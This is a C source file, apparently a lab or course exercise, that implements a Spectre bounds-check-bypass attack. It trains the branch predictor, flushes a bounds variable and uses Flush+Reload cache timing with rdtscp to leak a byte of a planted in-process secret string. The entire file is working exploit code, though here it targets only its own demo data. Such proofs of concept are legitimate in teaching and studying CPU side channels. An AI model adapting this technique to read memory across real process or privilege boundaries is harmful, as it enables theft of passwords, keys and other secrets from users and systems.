#include <emmintrin.h>
#include <x86intrin.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <time.h>

#define CACHE_HIT_THRESHOLD 200 // For Chuck
#define NUM_ATTACKS 1000
#define BUSY_WAIT 1000000  // Adjust based on trial/error

unsigned int bound_lower = 0;
unsigned int bound_upper = 9;
uint8_t buffer[10] = {0,1,2,3,4,5,6,7,8,9};
char    *secret    = "Some Secret Value";

typedef struct datablock {
        uint8_t lpad[1000];
        uint8_t rpad[1000];
        uint8_t dat;

} DataBlock;

DataBlock array[256];


/**
 * Sandbox Function - Returns the value of the buffer if you are making a request within
 * its bounds, otherwise returns 0.
 */
uint8_t restrictedAccess(size_t x) {
        if (x <= bound_upper && x >= bound_lower) {
                return buffer[x];
        } else {
                return 0;
        }
}

void flushSideChannel() {
    for (int i = 0; i < 256; i++) {
                                array[i].dat = 0;
        _mm_clflush(&array[i].dat);
    }
}


int reloadSideChannel() {
        uint64_t start, end;
        int access=0;
        volatile uint8_t *addr;
        int secret = -1;
        uint64_t best_cycles = -1;

        for (int i = 0; i < 256; i++) {
                addr = &array[i].dat;
                start = __rdtscp(&access);
                access = *addr;
                end = __rdtscp(&access);
                uint64_t cycles = end - start;
                //printf("cycles: %lu, index: %d\n", cycles, i);
                if (cycles <= CACHE_HIT_THRESHOLD && cycles < best_cycles) {
                        best_cycles = cycles;
                        secret = i;
                }
        }

        return secret;
}


/**
 * Abuse the spectre principle to steal a secret. After calling this
 * function, the cache should be setup in such a way that we can extract the
 * secret value, which is saved at the normally inaccessible location buffer[larger_x]
 */
 void spectreAttack(size_t index_beyond) {
  //train branch predictor
  for (int i = 0; i < 1000; i++) {
         _mm_clflush(&bound_upper);
         restrictedAccess(5);  // In-bounds access to train predictor
         }

         //force CPU speculation
         _mm_clflush(&bound_upper);

         //try to execute speculative access
         uint8_t secret = restrictedAccess(index_beyond); //mostly returns 0
         array[secret].dat += 1;
  }



 void busy_wait() {
        volatile int dummy = 0;
        for (int i = 0; i < BUSY_WAIT; i++) {
                dummy++;
        }
 }

 int main() {
     int results[256] = {0};//frequency counter
     size_t index_beyond = (size_t)((size_t) secret - (size_t) buffer);
     fprintf(stderr, "Targeting address %p at offset %zu\n", secret, index_beyond);

     for (int i = 0; i < NUM_ATTACKS; i++) {
         flushSideChannel();
         spectreAttack(index_beyond);
         int leaked = reloadSideChannel();

         if (leaked > 0) { //ignore zero, negative results
             results[leaked]++;
         }

         busy_wait();//delay
     }

     //find highest non-zero, non-negative hit
     int best_guess = -1;
     int max_count = 0;

     for (int i = 1; i < 256; i++) { //skip 0
         if (results[i] > max_count) {
             max_count = results[i];
             best_guess = i;
         }
     }

     if (best_guess != -1)
         printf("Most likely secret byte: %d (%c) with %d hits.\n", best_guess, best_guess, max_count);
     else
         printf("Failed to recover secret byte.\n");

     return 0;
 }

